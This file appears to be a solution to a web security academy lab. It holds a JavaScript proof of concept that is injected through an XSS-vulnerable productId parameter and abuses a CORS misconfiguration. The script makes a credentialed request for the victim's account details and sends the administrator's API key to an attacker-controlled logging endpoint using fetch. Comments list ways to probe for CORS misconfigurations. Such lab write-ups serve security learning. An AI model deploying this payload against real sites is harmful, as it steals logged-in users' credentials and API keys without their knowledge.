// Target Goal - exploit the CORS misconfiguration to retrieve the administrator's API key by XSS Vulnerability

// Analysis:

// Testing for CORS misconfigurations:
// 1. Change the origin header to an arbitrary value
// 2. Change the origin header to the null value
// 3. Change the origin header to one that begins with the origin of the site.
// 4. Change the origin header to one that ends with the origin of the site.


// here is the POC that we would put in <script> </script> tags and pass it to productId parameter, which is vulnerable to XSS


var xhr = new XMLHttpRequest();
var url = 'https://0a32007d04af53bf809f6c0e0089002f.web-security-academy.net';
xhr.onreadystatechange = function(){
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)
    };};
    xhr.open('GET', url + '/accountDetails', true);
    xhr.withCredentials = true;
    xhr.send(null);


// When the administrator user clicks on the link, he would execute our malicious script which basically makes a request to A server that we control in this example it's 127.0.0.1 and retrieves the administrator API key from it to us on A Golden Plate
